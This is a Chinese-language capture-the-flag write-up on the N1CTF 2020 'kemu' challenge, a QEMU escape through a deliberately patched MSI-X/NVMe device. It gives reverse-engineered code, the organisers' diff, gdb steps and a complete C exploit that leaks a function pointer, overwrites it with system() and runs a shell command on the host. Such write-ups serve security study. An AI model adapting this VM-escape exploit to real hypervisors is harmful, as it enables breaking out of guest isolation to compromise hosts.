# 2020N1CTF kemu

阅读量 **265983**

|![](https://p0.ssl.qhimg.com/sdm/30_30_100/t01f942715e2a0f1a23.png)

发布时间 : 2021-01-07 15:30:38

 **x**

##### 译文声明

本文是翻译文章

译文仅供参考，具体内容表达以及含义原文为准。

![](https://p5.ssl.qhimg.com/t01fedc2146d019d3c9.png)

## 前言

当时N1CTF kemu没做出来，而且没找到详细的writeup，于是前段时间无聊的时候把它翻出来研究了一下。

## Step1：分析设备

查看题目给的lanch.sh

    
    
    #!/bin/bash
    
    pwd=`pwd`
    
    #./qemu-system-x86_64 \
    timeout --foreground 600 ${pwd}/qemu-system-x86_64 \
        -initrd ${pwd}/rootfs.img -nographic -kernel ${pwd}/kernel-guest \
        -L ${pwd}/pc-bios -append "priority=low console=ttyS0 loglevel=3 kaslr" \
        -drive file=${pwd}/nvme.raw,format=raw,if=none,id=Dxx -device nvme,drive=Dxx,serial=1234 \
        -monitor /dev/null
    

设备就是nvme，它是qemu中存在的PCI设备。

在qemu中查看PCI的I/O信息，我第一次在ubuntu16.04上运行，报错为libc.so.6需要libc-2.27.so来运行，因此使用ubuntu18.04运行。`sudo
./lauch.sh`

    
    
    /home/pwn # lspci
    00:01.0 Class 0601: 8086:7000
    00:04.0 Class 0108: 8086:5845 -> nvme
    00:00.0 Class 0600: 8086:1237
    00:01.3 Class 0680: 8086:7113
    00:03.0 Class 0200: 8086:100e
    00:01.1 Class 0101: 8086:7010
    00:02.0 Class 0300: 1234:1111
    

搜索资料知道nvme设备的设备号是设备号是5845

    
    
    /home/pwn # cat /sys/devices/pci0000\:00/0000\:00\:04.0/resource
    0x00000000febf0000 0x00000000febf1fff 0x0000000000140204
    0x0000000000000000 0x0000000000000000 0x0000000000000000
    0x0000000000000000 0x0000000000000000 0x0000000000000000
    0x0000000000000000 0x0000000000000000 0x0000000000000000
    0x00000000febf3000 0x00000000febf3fff 0x0000000000040200
    

## Step2：分析函数

用IDA打开qemu-system-x86_64，发现程序被去符号化了，很多函数没有识别出来，而且比赛时没给diff，因此很难定位漏洞函数。可以试着从其他带符号的qemu-system-x86_64程序或者源代码进行对比分析，恢复部分函数名便于分析。

从启动脚本中知道设备是nvme，那么先定位region，从nvme_realize函数初始化的region下手。

![](https://p3.ssl.qhimg.com/t01e3dcf57d79e265bc.png)

注册了nvme_ops内存操作空间，但这题的漏洞不在这里。往下看msix_init_exclusive_bar也利用了这个设备

![](https://p0.ssl.qhimg.com/t01cb7f3602feb5b964.png)

这里也对这个BAR空间进行了初始化，并调用了msix_init对msix中断机制进行初始化。

    
    
    __int64 __fastcall msix_init(__int64 a1, unsigned __int16 a2, __int64 table_bar, unsigned __int8 a4, unsigned int table_offset, __int64 pba_bar, unsigned __int8 a7, unsigned int pba_offset, unsigned __int8 a9, __int64 a10)
    {
      ......
      result = sub_4F7A70(a1, 0x11u, a9, 12, a10);
      if ( result >= 0 )
      {
        ......
        sub_4FACA0(a1, a2);
        memory_region_init_io(a1 + 0x820, a1, misx_table_mmio_ops, a1, "msix-table", v11);
        memory_region_add_subregion(table_bar, table_offset, a1 + 0x820);
        memory_region_init_io(a1 + 0x910, a1, msix_pba_mmio_ops, a1, "msix-pba", 0x200LL);
        memory_region_add_subregion(pba_bar, pba_offset, a1 + 0x910);
        result = 0LL;
      }
      return result;
    }
    

能发现它们分别注册了msix_table_mmio_ops和msix_pba_mmio_ops到table_bar和pba_bar。

###  MSI-X Capability结构的组成方式

MSI-X中断机制中，MSI-X Table structure和PBA
structure存放在设备的BAR空间里，这两个structure可以map到相同BAR，也可以map到不同BAR，但是这个BAR必须是memory
BAR而不能是IO
BAR，也就是说两个structure要map到memory空间。而在这题中`table_bar==pba_bar`，它们同时共享一段mmio内存空间。

![](https://p2.ssl.qhimg.com/t01f4550bf8a13801d3.png)

现在出现一个问题，它们都映射到同一个BAR空间中，而这段内存大小为0x1000，如何区分两者呢？追溯table_offset和pba_offset可以知道到，table_offset为0，而在msix_init_exclusive_bar函数中可以看到pba_offset>=0x800，在调试中能确定pba_offset就等于0x800。如果环境中的lspci命令支持-v选项应该是可以看到这个参数的，可惜在这题环境中只支持-mk。

    
    
    __int64 __fastcall msix_table_mmio_read(PCIDevice *a1)
    {
      int v1; // eax
    
      v1 = *a1->crypt.statu;
      if ( v1 == 2 )
        return a1->crypt.mode[0];
      if ( v1 != 3 )
        return v1 == 1;
      (*a1->crypt.crypt_func)(&a1->crypt, *a1->crypt.mode, a1->crypt.input, a1->crypt.output);
      return 0LL;
    }
    
    
    
    void __fastcall msix_table_mmio_write(PCIDevice *a1, __int64 a2, char a3, int size)
    {
      char op; // al
    
      if ( size == 1 )
      {
        *&op = *a1->crypt.statu;
        switch ( *&op )
        {
          case 2:
            *a1->crypt.mode = a3;
            break;
          case 3:
            *a1->crypt.crypt_func = crypt_exe_func;
            break;
          case 1:
            *a1->crypt.statu = a3;
            break;
        }
      }
    }
    
    
    
    __int64 __usercall msix_pba_mmio_read@<rax>(int a1@<edx>, char a2@<bpl>, PCIDevice *dev@<rdi>, size_t addr@<rsi>)
    {
      void (__fastcall *v6)(PCIDevice *, __int64, size_t); // rax
      size_t v7; // rdx
      __int64 v8; // rsi
      __int64 result; // rax
      int v10; // eax
    
      v6 = *&dev[1].crypt.input[0x20];
      if ( v6 )
      {
        v7 = addr + (8 * a1);
        v8 = (8 * addr);
        if ( v7 > *&dev->field_0[1156] )
          v7 = *&dev->field_0[1156];
        v6(dev, v8, v7);
      }
      if ( addr == 1 )
      {
        *dev->crypt.statu = 1;
        return a2;
      }
      if ( addr == 2 )
      {
        *dev->crypt.key = 0LL;
        *&dev->crypt.key[120] = 0LL;
        memset((&dev->crypt.key[8] & 0xFFFFFFFFFFFFFFF8LL), 0, 8LL * ((dev - ((dev + 1184) & 0xFFFFFFF8) + 1304) >> 3));
        *dev->crypt.input = 0LL;
        *&dev->crypt.input[120] = 0LL;
        memset((&dev->crypt.input[8] & 0xFFFFFFFFFFFFFFF8LL), 0, 8LL * ((dev - ((dev + 1312) & 0xFFFFFFF8) + 1432) >> 3));
        *dev->crypt.output = 0LL;
        *&dev->crypt.output[120] = 0LL;
        memset((&dev->crypt.output[8] & 0xFFFFFFFFFFFFFFF8LL), 0, 8LL * ((dev - ((dev + 1440) & 0xFFFFFFF8) + 1560) >> 3));
        return a2;
      }
      v10 = *dev->crypt.statu;
      if ( v10 == 1 )
      {
        if ( strlen(dev->crypt.key) + 16 > addr )
          goto LABEL_12;
        result = 0LL;
      }
      else
      {
        if ( v10 != 2 )
        {
          if ( strlen(dev->crypt.output) + 272 <= addr )
            return 0LL;
    LABEL_12:
          if ( a1 == 1 )
            return dev->field_0[addr + 0x488];
          return 0LL;
        }
        if ( strlen(dev->crypt.input) + 144 > addr )
          goto LABEL_12;
        result = 0LL;
      }
      return result;
    }
    
    
    
    void __fastcall msix_pba_mmio_write(PCIDevice *opaque, unsigned __int64 addr, char val, int size)
    {
      int v4; // eax
      unsigned __int64 v5; // rsi
    
      if ( size == 1 )
      {
        v4 = *opaque->crypt.statu;
        if ( v4 == 1 )
        {
          if ( addr <= 0x7F )
            opaque->crypt.key[addr] = val;
        }
        else if ( v4 == 2 )
        {
          v5 = addr - 0x80;
          if ( v5 <= 0x7F )
            opaque->crypt.input[v5] = val;
        }
      }
    }
    

官方赛后在github上放出了diff文件，因此可以对着diff文件分析一下漏洞函数。查看pci_patch.diff和msix_patch.diff文件

    
    
    --- pci.h    2019-04-24 02:14:46.000000000 +0800
    +++ pci_change.h    2020-06-09 11:20:45.639622000 +0800
    @@ -317,6 +317,16 @@
         /* Space to store MSIX table & pending bit array */
         uint8_t *msix_table;
         uint8_t *msix_pba;
    +
    +    struct CryptState{
    +        char key[0x80];
    +        char input[0x80];
    +        char output[0x80];
    +        void (*crypt_func)(char *key,int mode,char *input,char *output);
    +        int statu;
    +        int mode;
    +    }crypt;
    +    char buf[0x100];
         /* MemoryRegion container for msix exclusive BAR setup */
         MemoryRegion msix_exclusive_bar;
         /* Memory Regions for MSIX table and pending bit entries. */
    
    
    
    --- msix.c    2019-04-24 02:14:45.000000000 +0800
    +++ msix_change.c    2020-10-16 14:20:52.271587000 +0800
    @@ -174,24 +174,96 @@
         }
     }
    
    +static void crypt_en_func(char *key,char *input,char *output){
    +    int len = strlen(input);
    +    int len_key = strlen(key);
    +    int i=0;
    +    if(len_key == 0 || len == 0){
    +        return;
    +    }
    +    while(len){
    +        output[i] = input[i]^key[i%len_key];
    +    i += 1;
    +    len -= 1;
    +    }
    +}
    +
    +static void crypt_de_func(char *key,char *input,char *output){
    +    int len = strlen(input);
    +    int len_key = strlen(key);
    +    int i=0;
    +    if(len_key == 0 || len == 0){
    +        return;
    +    }
    +    while(len){
    +        output[i] = input[i]^key[i%len_key];
    +    i += 1;
    +    len -= 1;
    +    }
    +}
    +
    +static void crypt_exe_func(char *key,int mode,char *input,char *output){
    +    switch(mode){
    +        case 1:
    +        crypt_en_func(key,input,output);
    +        break;
    +    case 2:
    +        crypt_de_func(key,input,output);
    +        break;
    +    default:
    +        break;
    +    }
    +}
    +
     static uint64_t msix_table_mmio_read(void *opaque, hwaddr addr,
                                          unsigned size)
     {
         PCIDevice *dev = opaque;
    
    -    return pci_get_long(dev->msix_table + addr);
    +    char value;
    +    switch(dev->crypt.statu){
    +        case 1:
    +        value = dev->crypt.statu;
    +        break;
    +    case 2:
    +        value = dev->crypt.mode;
    +        break;
    +    case 3:
    +        dev->crypt.crypt_func(dev->crypt.key,dev->crypt.mode,dev->crypt.input,dev->crypt.output);
    +        break;
    +    default:
    +        break;
    +    }
    +    return value;
    +    //return pci_get_long(dev->msix_table + addr);
     }
    
     static void msix_table_mmio_write(void *opaque, hwaddr addr,
                                       uint64_t val, unsigned size)
     {
         PCIDevice *dev = opaque;
    -    int vector = addr / PCI_MSIX_ENTRY_SIZE;
    -    bool was_masked;
    +    //int vector = addr / PCI_MSIX_ENTRY_SIZE;
    +    //bool was_masked;
    
    -    was_masked = msix_is_masked(dev, vector);
    -    pci_set_long(dev->msix_table + addr, val);
    -    msix_handle_mask_update(dev, vector, was_masked);
    +    //was_masked = msix_is_masked(dev, vector);
    +    //pci_set_long(dev->msix_table + addr, val);
    +    //msix_handle_mask_update(dev, vector, was_masked);
    +    if(size == 1){
    +    char value = val;
    +        switch(dev->crypt.statu){
    +            case 1:
    +            dev->crypt.statu = value;
    +        break;
    +        case 2:
    +        dev->crypt.mode = value;
    +        break;
    +        case 3:
    +        dev->crypt.crypt_func = crypt_exe_func;
    +        break;
    +        default:
    +        break;
    +        }
    +    }
     }
    
     static const MemoryRegionOps msix_table_mmio_ops = {
    @@ -214,12 +286,64 @@
             dev->msix_vector_poll_notifier(dev, vector_start, vector_end);
         }
    
    -    return pci_get_long(dev->msix_pba + addr);
    +    char value;
    +    switch(addr){
    +        case 1:
    +        dev->crypt.statu = 1;
    +        break;
    +    case 2:
    +        memset(dev->crypt.key,0,0x80);
    +        memset(dev->crypt.input,0,0x80);
    +        memset(dev->crypt.output,0,0x80);
    +        break;
    +    default:
    +        if(dev->crypt.statu == 1){
    +            if(addr >= 0x10 + strlen(dev->crypt.key) || (size != 1)){
    +            return 0;
    +        }
    +        value = dev->crypt.key[addr-0x10];
    +        }
    +        else if(dev->crypt.statu == 2){
    +            if(addr >= 0x90 + strlen(dev->crypt.input) || (size != 1)){
    +            return 0;
    +        }
    +        value = dev->crypt.input[addr-0x90];
    +        }
    +        else{
    +            if(addr >= 0x110 + strlen(dev->crypt.output) || (size != 1)){
    +            return 0;
    +        }
    +        value = dev->crypt.output[addr-0x110];
    +        }
    +        break;
    +    }
    +    return value;
    +    //return pci_get_long(dev->msix_pba + addr);
     }
    
     static void msix_pba_mmio_write(void *opaque, hwaddr addr,
                                     uint64_t val, unsigned size)
     {
    +    PCIDevice *dev = opaque;
    +    if(size == 1){
    +    char value = val;
    +        switch(dev->crypt.statu){
    +        case 1:
    +        if(addr >= 0x80){
    +            return;
    +        }
    +        dev->crypt.key[addr] = value;
    +        break;
    +        case 2:
    +        if(addr < 0x80 || addr >= 0x100){
    +            return;
    +        }
    +        dev->crypt.input[addr-0x80] = value;
    +        break;
    +        default:
    +        break;
    +        }
    +    }
     }
    
     static const MemoryRegionOps msix_pba_mmio_ops = {
    @@ -288,7 +412,8 @@
         }
    
         table_size = nentries * PCI_MSIX_ENTRY_SIZE;
    -    pba_size = QEMU_ALIGN_UP(nentries, 64) / 8;
    +    //pba_size = QEMU_ALIGN_UP(nentries, 64) / 8;
    +    pba_size = 0x200;
    
         /* Sanity test: table & pba don't overlap, fit within BARs, min aligned */
         if ((table_bar_nr == pba_bar_nr &&
    

通过分析，得出其各部分功能  
1、crypt_en_func/crypt_de_func：使用strlen函数获取input和key数组的长度，进行抑或后将结果赋值给ouput  
2、crypt_exe_func：调用crypt_en_func/crypt_de_func函数  
3、msix_table_mmio_read：

  * statu=1时，返回statu  
statu=2时，返回mode  
statu=3时，调用crypt_func函数指针

4、msix_table_mmio_write：size=1

  * statu=1时，statu=value更新状态statu  
statu=2时，mode=value  
statu=3时，将crypt_func赋值为crypt_exe_func指针

5、 msix_pba_mmio_read：

  * addr=1时，statu=1  
addr=2时，初始化key、input、output  
else：size=1

    * statu=1时，判断addr是否大于等于strlen(key)，符合的话就返回key[addr-0x10]  
statu=2时，判断addr是否大于等于strlen(input)，符合的话就返回input[addr-0x90]  
else，判断addr是否大于等于strlen(output)，符合的话就返回output[addr-0x110]  
注意key、input、ouput大小都为0x80，所以可以认为他们起始的地址都是key[addr-0x10]

6.、msix_pba_mmio_write：size=1

  * statu=1时，判断addr大小，key[addr]=value  
statu=2时，判断addr大小，input[addr-0x80]=value

通过以上分析可以看出漏洞点

  * crypt_en_func/crypt_de_func函数使用strlen获取数组长度，若key和input数组填满，可以将output溢出到crypt_func
  * msix_pba_mmio_read函数中，同样使用的是strlen判断数组长度，因此可以泄露读取crypt_func函数地址

利用思路为

  1. 将key和input数组填满，调用crypt_en_func填满output数组，泄露crypt_func函数指针，计算得到system函数地址
  2. 将key和input数组填满，溢出覆盖crypt_func函数指针为system函数
  3. 在key数组中写入”cat flag“指令，并调用crypt_func函数

## Step3：编写exp

在覆盖crypt_func函数指针时，写入的值是通过key与output前8个字节进行抑或得到的，而output是通过key与input前8个字节得到的，也就是说我们写入的addr是通过key两次抑或的结果。我们知道，`value^key^key==value`，因此如果0x80是key的长度与8的公倍数，必然会导致addr=input，但是这样一来strlen(input)<0x80，就不能导致溢出覆盖。所以我设置一个长度为6的key数组，最后得到的addr计算方法如下：

    
    
    offset = 0x80%6    #offset = 2
    addr = system ^ (key[:]+key[:2]) ^ (key[2:]+key[:4])
    

假设`key[6] = {1,2,3,4,5,6}`，那么`addr = system ^ 0x0201060504030201 ^
0x0403020106050403`  
调试命令

    
    
    #获取 qemu进程pid
    $  ps -ax | grep qemu
    $  sudo gdb -q
    pwndbg > file qemu-system-x86_64
    pwndbg > attach [PID]
    #获取程序基址
    pwndbg > vmmap
    pwndbg > b *[elf_base+0x4FA2D2]
    pwndbg > c
    

加解密前

![](https://p2.ssl.qhimg.com/t01442bfb2b26839211.png)

加解密后

![](https://p1.ssl.qhimg.com/t01416cbec3412171bd.png)

    
    
    #include <assert.h>
    #include <fcntl.h>
    #include <inttypes.h>
    #include <stdio.h>
    #include <stdlib.h>
    #include <string.h>
    #include <sys/mman.h>
    #include <sys/types.h>
    #include <unistd.h>
    #include<sys/io.h>
    
    uint32_t mmio_size = 0x1000;
    
    unsigned char* mmio_mem;
    
    void die(const char* msg)
    {
        perror(msg);
        exit(-1);
    }
    
    void mmio_write(uint32_t addr, uint8_t value)
    {
        *((uint8_t *)(mmio_mem + addr)) = value;
    }
    
    uint8_t mmio_read(uint32_t addr)
    {
        return *((uint8_t*)(mmio_mem + addr));
    }
    
    void set_statu(uint8_t value)
    {
        mmio_read(0x800+1);
        mmio_write(0,value);
    }
    void set_cryptfunc(){
        set_statu(3);
        mmio_write(0,0);
    }
    void call_cryptfunc(){
        set_statu(3);
        mmio_read(0);
    }
    void set_mode(uint8_t value){
        set_statu(2);
        mmio_write(0,value);
    }
    void set_key(uint32_t addr, uint8_t value)
    {
        mmio_read(0x800+1);
        mmio_write(addr+0x800,value);
    }
    void set_input(uint32_t addr, uint8_t value)
    {
        set_statu(2);
        mmio_write(addr+0x800+0x80,value);
    }
    void reset(){
        mmio_read(0x800+2);
    }
    char get_key(uint32_t addr){
        set_statu(1);
        return mmio_read(addr+0x800+0x10);
    }
    char get_input(uint32_t addr){
        set_statu(2);
        return mmio_read(addr+0x800+0x90);
    }
    char get_output(uint32_t addr){
        set_statu(3);
        return mmio_read(addr+0x800+0x110);
    }
    
    int main(int argc, char *argv[])
    {
        int fd = open("/sys/devices/pci0000:00/0000:00:04.0/resource4", O_RDWR | O_SYNC);
        if (fd == -1)
            die("mmio_fd open failed");
        mmio_mem = mmap( NULL, mmio_size, PROT_READ | PROT_WRITE, MAP_SHARED, fd,0 );
        if ( !mmio_mem ) {
            die("mmap mmio failed");
        }
    
        //Step1: leak func addr
        char buf[0x10]={0};
        set_key(0,0x41);
        for(int i=0;i<0x80;i++){
            set_input(i,0x62);
        }
        set_cryptfunc();
        set_mode(1);
        call_cryptfunc();//0x4FA2D2
        for(int i=0;i<8;i++){
            buf[i] = get_output(i+0x80);
        }
        size_t elf_base = *((size_t*)buf) - 0x4fa470;
        printf("ELF base = %p\n",elf_base);
        size_t system = elf_base+0x2A6BB0;
    
        //Step2: change func ptr -> system
        set_key(0,0x1);
        set_key(1,0x2);
        set_key(2,0x3);
        set_key(3,0x4);
        set_key(4,0x5);
        set_key(5,0x6);
        size_t tmp_addr = system^0x0201060504030201^0x0403020106050403;
        for(int i=0;i<0x8;i++){
            uint8_t tmp= tmp_addr>>(i*8);
            set_input(i,tmp);
        }
        call_cryptfunc();
    
        //Step3：write cat /flag to key
        set_key(0,0x63);
        set_key(1,0x61);
        set_key(2,0x74);
        set_key(3,0x20);
        set_key(4,0x2f);
        set_key(5,0x66);
        set_key(6,0x6c);
        set_key(7,0x61);
        set_key(8,0x67);
        call_cryptfunc();
        return 0;
    }
    

成功实现qemu逃逸

![](https://p0.ssl.qhimg.com/t01284ce078c3afd2c9.png)

## 总结

首先感谢V1NKe大佬给我分享一些做qemu的思路。一般先定位region，从realize函数初始化的region下手；或者可以从设备的具体作用及其与其他机制间的交互联系下手进行定位分析。

## Reference

[MSI-X介绍](https://blog.csdn.net/linjiasen/article/details/105858038)  
[msix_patch.diff](https://github.com/Nu1LCTF/n1ctf-2020/blob/main/PWN/Kemu/Source/msix_patch.diff)  
[linux里的nvme驱动代码分析](https://blog.csdn.net/panzhenjie/article/details/51581063)

本文翻译自 [原文链接]()。如若转载请注明出处。

商务合作，文章发布请联系 anquanke@360.cn

本文由 **Leo** 原创发布

转载，请参考[转载声明](https://www.anquanke.com/note/repost)，注明出处：
[https://www.anquanke.com/post/id/227332](/post/id/227332)

安全客 - 有思想的安全新媒体

本文转载自: []()

如若转载,请注明出处： []()

安全客 - 有思想的安全新媒体

分享到：![微信](https://p0.ssl.qhimg.com/sdm/28_28_100/t01e29062a5dcd13c10.png)

  * [Pwn](/tag/Pwn)

 **+1** __1赞

 __收藏

![](https://thirdqq.qlogo.cn/g?b=oidb&k=zIlRZ9tvSN3Z56QlcST1vQ&s=40) Leo

分享到：![微信](https://p0.ssl.qhimg.com/sdm/28_28_100/t01e29062a5dcd13c10.png)

